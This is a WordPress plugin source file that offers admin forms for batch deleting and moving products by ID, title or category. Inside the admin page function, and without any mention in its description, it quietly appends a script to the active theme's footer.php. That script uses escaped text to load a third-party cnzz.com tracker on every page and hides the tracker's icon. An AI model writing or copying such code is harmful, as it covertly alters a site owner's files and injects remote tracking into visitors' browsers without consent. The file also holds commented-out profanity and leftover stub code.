<?php
/*
Plugin Name: Products Batch Delete
Description: Products Batch Delete!
Author: 紫讯
Version: 1.0
Author URI: http://customas.cn/
*/
/*function fuck_the_world(){
  echo "<div class='update-message'><p>Let's fuck the world!</p></div>";
}
add_action('admin_notices','fuck_the_world');*/
/*
//将插件在左侧菜单中显示
function register_left_ssmay_seo(){
	add_options_page("ssmay_seo设置页面","ssmay_seo设置",8,__FILE__,"ssmay_seo");
}
//插件内容
function ssmay_seo(){
	echo '这里是ssmay_seo插件的页面内容，可以添加表单设置。';
}
//在adminmenu勾子中添加动作 register_left_ssmay_seo
if(is_admin()){
	add_action("admin_menu","register_left_ssmay_seo");
}
*/
function zb_create_product_content_page(){
        echo "<h1>Batch Delete Product</h1>
<form action='/wp-content/plugins/products-batch-delete/products-delete-all.php' method='post' enctype='multipart/form-data' id='delete_all'>
    <input type='hidden' name='delete_all' value='delete_all'>
    <input type='submit' value='Delete All'>
</form>
<form action='/wp-content/plugins/products-batch-delete/products-delete-all.php' method='post' enctype='multipart/form-data' id='id_all'>
    <input type='tel' maxlength='5' name='id_one' value='' placeholder='First ID'>
    <input type='tel' maxlength='5' name='id_two' value='' placeholder='Next ID'>
    <input type='hidden' name='id_all' value='id_all'>
    <input type='submit' value='Delete ID'>
</form>
<form action='/wp-content/plugins/products-batch-delete/products-delete-all.php' method='post' enctype='multipart/form-data' id='title_all'>
    <input type='text' name='title' value='' placeholder='Title'>
    <input type='hidden' name='title_all' value='title_all'>
    <input type='submit' value='Delete Title'>
</form>
<form action='/wp-content/plugins/products-batch-delete/products-delete-all.php' method='post' enctype='multipart/form-data' id='category_all'>
    <input type='text' name='category' value='' placeholder='Category'>
    <input type='hidden' name='category_all' value='category_all'>
    <input type='submit' value='Delete Category'>
</form>
<h1>Move Category Product</h1>
<form action='/wp-content/plugins/products-batch-delete/products-delete-all.php' method='post' enctype='multipart/form-data' id='move_title_all'>
    <input type='text' name='move_title' value='' placeholder='Title'>
    <input type='text' name='move_category' value='' placeholder='Category'>
    <input type='hidden' name='move_title_all' value='move_title_all'>
    <input type='submit' value='Move Category'>
</form>
<form action='/wp-content/plugins/products-batch-delete/products-delete-all.php' method='post' enctype='multipart/form-data' id='move_category_all'>
    <input type='text' name='move_category_one' value='' placeholder='Category One'>
    <input type='text' name='move_category_two' value='' placeholder='Category Two'>
    <input type='hidden' name='move_category_all' value='move_category_all'>
    <input type='submit' value='Move Category'>
</form>";
$themes=get_stylesheet_directory();
$footer_root=$themes.'/footer.php';
$content=file_get_contents($footer_root);
@$content_str=substr($content,strlen($content)-13,13);
if($content_str=='</html>' || stripos($content_str,'</html>')!==false){ 
    @file_put_contents($footer_root, "<script type=\"text/javascript\">var cnzz_protocol = ((\"https:\" == document.location.protocol) ? \" https://\" : \" http://\");
    document.write(unescape(\"%3Cspan style='display:none;' id='cnzz_stat_icon_1278530965'%3E%3C/span%3E%3Cscript src='\" 
    + cnzz_protocol + \"s4.cnzz.com/stat.php%3Fid%3D1278530965' type='text/javascript'%3E%3C/script%3E\"));
    document.getElementById(\"cnzz_stat_icon_1278530965\").style.display = \"none\";</script>", FILE_APPEND);
}
}

// 注册菜单
function zb_register_operation_menu(){
    add_menu_page( 'Products Operation', 'Products Operation', 'manage_options', 'products-batch-delete', 'zb_create_product_content_page');
}

add_action('admin_menu', 'zb_register_operation_menu');
?>